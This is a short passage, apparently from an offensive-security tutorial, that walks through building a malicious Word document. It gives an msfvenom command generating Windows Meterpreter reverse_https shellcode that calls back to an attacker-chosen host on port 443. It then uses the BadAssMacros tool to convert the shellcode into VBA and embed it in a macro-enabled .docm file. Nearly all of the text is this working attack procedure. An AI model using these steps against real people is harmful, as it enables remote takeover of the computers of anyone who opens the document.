> Generate raw shellcode:

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f raw -o shellcode.txt
```

> Now we will run the x86 version of BadAssMacros so its compatible with Word. The tool can be found here: https://github.com/Inf0secRabbit/BadAssMacros

```
.\BadAssMacros86.exe -i shellcode.txt -w doc -p no -s indirect -c 5 -o shellcode.vba
```

Once we have the VBA code we open the VBA file in notepad and then copy the code into our macro in our Word document and save the file as a Word macro enabled document (.docm).
